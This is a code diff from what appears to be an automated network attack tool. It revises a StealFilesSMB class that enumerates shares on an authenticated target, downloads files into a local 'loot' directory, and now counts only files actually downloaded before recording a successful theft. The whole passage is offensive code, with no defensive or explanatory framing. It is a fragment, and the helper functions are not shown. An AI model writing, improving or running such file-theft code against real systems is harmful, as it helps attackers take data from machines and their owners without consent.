@@ -168,7 +168,7 @@ class StealFilesSMB(BaseStealer):
         that was already present before the #12 conversion.
         """
         local_base = self.loot_dir(ip, row)
-        any_stolen = False
+        before = getattr(self, '_stolen_count', 0)
         shares = self.list_shares(conn)
         for share in shares:
             if getattr(self, 'stop_execution', False) or self.shared_data.orchestrator_should_exit:
@@ -178,15 +178,24 @@ class StealFilesSMB(BaseStealer):
             if not remote_files:
                 continue
             local_dir = os.path.join(local_base, share_name)
+            share_before = getattr(self, '_stolen_count', 0)
             for remote_file in remote_files:
                 if getattr(self, 'stop_execution', False) or self.shared_data.orchestrator_should_exit:
                     break
                 self.steal_file(conn, share_name, remote_file, local_dir)
-            any_stolen = True
-            logger.success(
-                f"Successfully stolen {len(remote_files)} file(s) from "
-                f"{ip} share '{share_name}'")
-        return any_stolen
+            got = getattr(self, '_stolen_count', 0) - share_before
+            if got:
+                logger.success(
+                    f"Stole {got} of {len(remote_files)} file(s) from {ip} share '{share_name}'")
+        # #5: success is loot on disk, not shares that merely listed files — the old any_stolen
+        # went True the moment a share had matches, even if every download then failed.
+        stolen = getattr(self, '_stolen_count', 0) - before
+        if stolen <= 0:
+            logger.error(
+                f"Authenticated to {ip} but downloaded no files from any share — "
+                f"not recording a steal with no loot.")
+            return False
+        return True
 
 
 if __name__ == "__main__":
